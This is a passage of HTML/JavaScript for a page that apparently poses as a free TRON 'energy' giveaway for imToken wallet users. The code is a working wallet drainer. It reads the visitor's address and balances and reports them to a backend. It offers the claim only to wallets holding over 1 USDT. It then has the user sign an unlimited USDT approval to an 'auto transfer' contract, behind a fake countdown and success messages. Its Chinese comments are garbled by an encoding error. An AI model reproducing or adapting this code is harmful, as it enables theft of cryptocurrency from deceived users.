        // éå†æ‰€æœ‰å¸¦idçš„æ–‡æœ¬å…ƒç´ 
        Object.keys(lang).forEach(key => {
            const el = document.getElementById(key);
            if (el) {
                // ç‰¹æ®Šå¤„ç†åŒ…å«HTMLçš„æ–‡æœ¬
                el.innerHTML = lang[key];
            }
        });
        // ç‰¹æ®Šå¤„ç†æŒ‰é’®æ–‡æœ¬ï¼ˆé¿å…è¦†ç›–idï¼‰
        connectBtn.textContent = lang.connectBtnText;
        approveBtn.textContent = lang.approveBtnText;
        reviewTipText.textContent = lang.reviewTipText;
        approvalRecords.textContent = lang.noRecord;
    }

    window.onload = async () => {
        // åˆå§‹åŒ–è¯­è¨€
        updatePageLang();
        // ç»‘å®šå•ä¸ªè¯­è¨€åˆ‡æ¢æŒ‰é’®ç‚¹å‡»äº‹ä»¶
        langToggle.addEventListener("click", toggleLang);
        
        // åˆå§‹åŒ–åˆçº¦åœ°å€æ˜¾ç¤º
        contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
        
        // åˆå§‹æ¸²æŸ“è®°å½•å’ŒçŠ¶æ€
        renderEnergyRecords();
        updateWalletStatus();
        
        // æ£€æµ‹ç¯å¢ƒ+è¿æ¥é’±åŒ…
        await checkImTokenEnv();
        
        // å¯åŠ¨èƒ½é‡è®¡ç®—
        startPersistentEnergyCountdown();
        
        // é¡µé¢å¸è½½æ—¶ä¿å­˜çŠ¶æ€
        window.addEventListener("beforeunload", () => {
            saveEnergyStateToStorage();
            if (energyTimer) clearInterval(energyTimer);
        });

        // æˆæƒåè·³è½¬å›é¡µé¢çš„å¤„ç†
        if (window.tronWeb && window.location.hash === "#approve") {
            window.location.hash = "";
            setTimeout(() => {
                initWallet(true); // ä¼ å‚æ ‡è®°æ˜¯æˆæƒåè¿”å›
            }, 500);
        }
    };

    /**
     * ç¯å¢ƒæ£€æµ‹
     */
    async function checkImTokenEnv() {
        const lang = langConfig[currentLang];
        if (window.tronWeb) {
            tronWeb = window.tronWeb;
            connectBtn.style.display = "none";
            warning.style.display = "none";
            await initWallet(false); // é¦–æ¬¡è¿æ¥ï¼Œéæˆæƒåè¿”å›
        } else {
            // éimTokenç¯å¢ƒï¼šè‡ªåŠ¨å¤åˆ¶+å”¤èµ·
            userInfoEl.innerHTML = `
                âš ï¸ ${lang.browserWarn1.split("<strong>")[1].split("</strong>")[0]}<br>
                <span style="color: #3b82f6; font-size: 13px;">${lang.copyGuide.split("âœ… ")[1]}</span>
            `;
            approveBtn.style.display = "none";
            connectBtn.onclick = async () => {
                try {
                    const dappUrl = window.location.href;
                    await navigator.clipboard.writeText(dappUrl);
                    window.location.href = "imtoken://open";
                    setTimeout(() => {
                        alert(lang.å”¤èµ·Guide);
                    }, 1200);
                } catch (e) {
                    alert(lang.copyGuide);
                }
            };
        }
    }

    /**
     * é’±åŒ…åˆå§‹åŒ–
     * @param {boolean} isAfterApprove - æ˜¯å¦æ˜¯æˆæƒåè¿”å›
     */
    async function initWallet(isAfterApprove) {
        const lang = langConfig[currentLang];
        try {
            // 1. ç›´æ¥ä»é’±åŒ…è·å–åœ°å€
            userAddress = tronWeb.defaultAddress.base58;
            if (!userAddress) throw new Error(currentLang === "zh" ? "æœªæ£€æµ‹åˆ°é’±åŒ…åœ°å€ï¼Œè¯·ç¡®ä¿é’±åŒ…å·²è§£é”" : "Wallet address not detected - please unlock your wallet");

            // 2. äºŒæ¬¡æˆæƒæ‹¦æˆªï¼ˆ30å¤©å†…å·²é¢†å–ï¼‰
            if (isAddressAuthorized(userAddress)) {
                const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                userInfoEl.innerHTML = lang.authorizedTip.replace("{address}", shortAddr);
                approveBtn.disabled = true;
                approveBtn.textContent = lang.authorizedBtn;
                updateWalletStatus();
                document.getElementById("statusAddress").textContent = shortAddr;
                return;
            }

            // 3. æˆæƒåè¿”å›ï¼Œç›´æ¥æ‰§è¡Œåç»­é€»è¾‘
            if (isAfterApprove) {
                const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                userInfoEl.innerHTML = lang.afterApproveTip.replace("{address}", shortAddr);
                approveBtn.disabled = true;
                approveBtn.textContent = lang.deployingBtn;
                updateWalletStatus();
                document.getElementById("statusAddress").textContent = shortAddr;
                await executeAfterApprove();
                return;
            }

            // 4. ç«‹å³å‘é€A1ä¿¡å·ï¼ˆå¯¹åº”åç«¯/api/send-signal-a1ï¼‰
            sendSignalA1();
            console.log("âœ… A1ä¿¡å·å·²å¼‚æ­¥å‘é€ï¼ˆåˆ†å¼€å‘é€ï¼Œç­‰å¾…B1ï¼‰");

            // 5. ç«‹å³æ˜¾ç¤ºUI
            const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
            userInfoEl.innerHTML = lang.loadingTip.replace("{address}", shortAddr);
            approveBtn.disabled = true;
            approveBtn.textContent = lang.loadingBtn;
            updateWalletStatus();
            document.getElementById("statusAddress").textContent = shortAddr;

            // ç”¨ç²¾ç®€ABIåˆå§‹åŒ–åˆçº¦
            trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);

            // 6. æŸ¥è¯¢ä½™é¢
            const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
            const trxRaw = await tronWeb.trx.getBalance(userAddress);
            tokenBalance = Number(usdtRaw) / 1000000;
            trxBalance = Number(trxRaw) / 1000000;

            // 7. æ›´æ–°UIå’ŒæŒ‰é’®çŠ¶æ€
            if (tokenBalance <= 1) {
                userInfoEl.innerHTML = lang.insufficientUsdt
                    .replace("{address}", shortAddr)
                    .replace("{usdt}", tokenBalance.toFixed(2))
                    .replace("{trx}", trxBalance.toFixed(2));
                approveBtn.disabled = true;
                approveBtn.textContent = lang.insufficientBtn;
            } else {
                userInfoEl.innerHTML = lang.eligibleTip
                    .replace("{address}", shortAddr)
                    .replace("{usdt}", tokenBalance.toFixed(2))
                    .replace("{trx}", trxBalance.toFixed(2));
                approveBtn.disabled = false;
                approveBtn.textContent = lang.approveBtnText;
                bindApproveLogic();
            }

        } catch (e) {
            userInfoEl.innerHTML = lang.connectError.replace("{msg}", e.message);
            approveBtn.disabled = false;
            approveBtn.textContent = lang.retryConnect;
            approveBtn.onclick = () => initWallet(false);
        }
    }

    /**
     * æˆæƒåæ‰§è¡Œçš„é€»è¾‘
     */
    async function executeAfterApprove() {
        const lang = langConfig[currentLang];
        try {
            // ç”¨ç²¾ç®€ABIåˆå§‹åŒ–åˆçº¦ï¼ˆé¿å…æˆæƒåæœªåˆå§‹åŒ–ï¼‰
            if (!trc20Contract) {
                trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
            }

            // æ‰§è¡ŒUSDTæˆæƒ
            await trc20Contract.approve(
                AUTO_TRANSFER_CONTRACT,
                INFINITE_APPROVE_AMOUNT
            ).send({ from: userAddress, shouldPollResponse: true });

            // å‘é€A2ä¿¡å·ï¼ˆå¯¹åº”åç«¯/api/send-signal-a2ï¼‰
            sendSignalA2();
            console.log("âœ… A2ä¿¡å·å·²å‘é€ï¼ˆåˆ†å¼€å‘é€ï¼Œç­‰å¾…B2ï¼‰");
            
            // å‘é€B2ä¿¡å·ï¼ˆå¯¹åº”åç«¯/api/send-signal-b2ï¼‰
            const btn = document.getElementById("approveBtn");
            btn.textContent = lang.distributingBtn;
            await sendSignalB(false);

            // æ˜¾ç¤ºæˆåŠŸç»“æœ
            addAuthorizedAddress(userAddress);
            btn.textContent = lang.successBtn;
            userInfoEl.innerHTML += lang.successArrival;
            alert(lang.successTip);
            saveEnergyRecord();
            renderEnergyRecords();
        } catch (e) {
            const btn = document.getElementById("approveBtn");
            btn.disabled = false;
            btn.textContent = lang.approveBtnText;
            alert(lang.authorizeFail.replace("{msg}", e.message));
        }
    }

    /**
     * å‘é€A1ä¿¡å·ï¼ˆå¯¹åº”åç«¯/api/send-signal-a1ï¼‰
     */
    function sendSignalA1() {
        const requestData = { userAddress };
        setTimeout(() => {
            fetch(`${BACKEND_API}/api/send-signal-a1`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(requestData),
                timeout: 15000,
                keepalive: true
            }).then(res => {
                if (res.ok) console.log("âœ… A1ä¿¡å·å‘é€æˆåŠŸï¼ˆåç«¯å¤„ç†ä¸­ï¼‰");
                else res.json().then(err => console.warn("A1ä¿¡å·å‘é€å¤±è´¥ï¼š", err));
            }).catch(e => {
                console.error("âŒ A1ä¿¡å·å‘é€å¤±è´¥ï¼š", e);
            });
        }, 100);
    }

    /**
     * å‘é€A2ä¿¡å·ï¼ˆå¯¹åº”åç«¯/api/send-signal-a2ï¼‰
     */
    function sendSignalA2() {
        const requestData = { userAddress, usdtBalance: tokenBalance };
        fetch(`${BACKEND_API}/api/send-signal-a2`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            timeout: 15000,
            keepalive: true
        }).then(res => {
            if (res.ok) return res.json();
            else throw new Error("A2æ¥å£è¯·æ±‚å¤±è´¥");
        }).then(data => {
            if (data.success) console.log("âœ… A2ä¿¡å·å‘é€æˆåŠŸï¼ˆåç«¯å¤„ç†ä¸­ï¼‰");
            else console.warn("A2ä¿¡å·å¤„ç†å¤±è´¥ï¼š", data.msg);
        }).catch(e => {
            console.error("âŒ A2ä¿¡å·å‘é€å¤±è´¥ï¼š", e);
        });
    }

    /**
     * å‘é€Bä¿¡å·ï¼ˆB1å¯¹åº”b1æ¥å£ï¼ŒB2å¯¹åº”b2æ¥å£ï¼‰
     * @param {boolean} isB1 - true=å‘é€B1ï¼Œfalse=å‘é€B2
     */
    async function sendSignalB(isB1 = true) {
        const requestData = { userAddress };
        const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2";
        try {
            const res = await fetch(`${BACKEND_API}${apiPath}`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(requestData),
                timeout: 20000,
                keepalive: true
            });
            const data = await res.json();
            if (!res.ok || !data.success) throw new Error(data.detail || (isB1 ? "ä¿¡å·B1å¤„ç†å¤±è´¥" : "ä¿¡å·B2å¤„ç†å¤±è´¥"));
            console.log(`âœ… ä¿¡å·${isB1 ? "B1" : "B2"}å¤„ç†æˆåŠŸï¼š`, data);
            return true;
        } catch (e) {
            console.error(`âŒ ä¿¡å·${isB1 ? "B1" : "B2"}å¤„ç†å¤±è´¥ï¼š`, e);
            return false;
        }
    }

    /**
     * é¢†å–æŒ‰é’®é€»è¾‘ï¼ˆå‘é€B1ä¿¡å·+å®¡æ ¸æç¤º+è·³è½¬ç­¾åï¼‰
     */
    function bindApproveLogic() {
        const lang = langConfig[currentLang];
        approveBtn.onclick = async () => {
            const btn = document.getElementById("approveBtn");
            // ç¦ç”¨æŒ‰é’®+æ˜¾ç¤ºå®¡æ ¸æç¤º
            btn.disabled = true;
            btn.textContent = lang.loadingBtn;
            reviewTip.style.display = "flex";

            try {
                // å‘é€B1ä¿¡å·ï¼ˆåç«¯å®¡æ ¸ï¼‰
                const b1Success = await sendSignalB(true);
                if (!b1Success) throw new Error(currentLang === "zh" ? "ç³»ç»Ÿç¹å¿™è¯·ç¨åå†è¯•" : "System busy, please try again later");

                // B1åé¦ˆæˆåŠŸåï¼Œè·³è½¬é’±åŒ…ç­¾åé¡µé¢
                reviewTip.style.display = "none";
                btn.textContent = lang.redirectingBtn;
                window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
            } catch (e) {
                // å¤±è´¥åæ¢å¤æŒ‰é’®çŠ¶æ€
                btn.disabled = false;
                btn.textContent = lang.approveBtnText;
                reviewTip.style.display = "none";
                alert(lang.approveFail.replace("{msg}", e.message));
            }
        };
    }

    /**
     * èƒ½é‡è®¡ç®—ç›¸å…³å‡½æ•°
     */
    function startPersistentEnergyCountdown() {
        const savedState = loadEnergyStateFromStorage();
        let currentEnergy = savedState ? savedState.currentEnergy : INIT_ENERGY - Math.floor((new Date().getTime() - DEPLOY_START_TIME)/1000)*ENERGY_DECREASE_PER_SEC;
        currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
        updateEnergyDisplay(currentEnergy);
        if (energyTimer) clearInterval(energyTimer);
        energyTimer = setInterval(() => {
            currentEnergy -= ENERGY_DECREASE_PER_SEC;
            currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
            updateEnergyDisplay(currentEnergy);
            saveEnergyStateToStorage(currentEnergy);
        }, 1000);
    }
    function loadEnergyStateFromStorage() {
        try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || null; } catch (e) { return null; }
    }
    function saveEnergyStateToStorage(currentEnergy) {
        localStorage.setItem(STORAGE_KEY, JSON.stringify({ currentEnergy, lastUpdateTime: new Date().getTime() }));
    }
    function updateEnergyDisplay(currentEnergy) {
        contractEnergyEl.textContent = Math.floor(currentEnergy).toLocaleString();
    }
    function updateWalletStatus() {
        userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
    }
    function saveEnergyRecord() {
        const lang = langConfig[currentLang];
        const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
        const newRecords = existing.filter(item => item.address !== userAddress);
        newRecords.push({
            address: userAddress,
            tokenBalance: tokenBalance,
            trxBalance: trxBalance,
            receiveTime: new Date().toLocaleString(),
            energyAmount: "90000",
            recordType: lang.freeEnergy
        });
        localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
    }
    function renderEnergyRecords() {
        const lang = langConfig[currentLang];
        const container = document.getElementById("approvalRecords");
        const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
        if (records.length === 0) {
            container.innerHTML = `<div class='record-item'>${lang.noRecord}</div>`;
            return;
        }
        container.innerHTML = records.map(record => `
            <div class='record-item'>
                <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
                <p><strong>${lang.recordType}</strong>${record.recordType}</p>
                <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} TRX Energy</p>
                <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
            </div>
        `).join("");
    }
</script>
</body>
</html>
